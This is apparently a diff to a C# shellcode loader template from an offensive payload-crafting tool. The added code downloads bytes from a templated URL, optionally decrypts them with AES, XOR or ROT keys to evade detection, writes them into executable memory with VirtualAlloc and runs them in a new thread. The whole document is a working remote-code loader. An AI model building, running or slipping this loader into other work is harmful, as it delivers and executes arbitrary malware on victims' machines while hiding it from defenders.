@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 #if AES
 using System.Security.Cryptography;
@@ -10,7 +10,6 @@ namespace Craft
     {
         public const uint EXECUTEREADWRITE  = 0x40;
         public const uint COMMIT_RESERVE = 0x3000;
-        public const uint INFINITE = 0xFFFFFFF;
 
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
@@ -26,13 +25,40 @@ namespace Craft
 
         public static void Main()
         {
-            {{PAYLOAD}}
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] buf = client.DownloadData("{{URL}}");
+
+#if AES
+            byte[] key = new byte[] {{AES_KEY}};
+            byte[] iv = new byte[] {{AES_IV}};
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV  = iv;
+                aes.Padding = PaddingMode.PKCS7;
+                using (ICryptoTransform decryptor = aes.CreateDecryptor())
+                {
+                    buf = decryptor.TransformFinalBlock(buf, 0, buf.Length);
+                }
+            }
+#elif XOR
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)((uint)buf[i] ^ {{XOR_KEY}});
+            }
+#elif ROT
+            for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - {{ROT_KEY}}) & 0xFF);
+            }            
+#endif
         
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
             Marshal.Copy(buf, 0, addr, buf.Length);
 
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            WaitForSingleObject(hThread, INFINITE);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
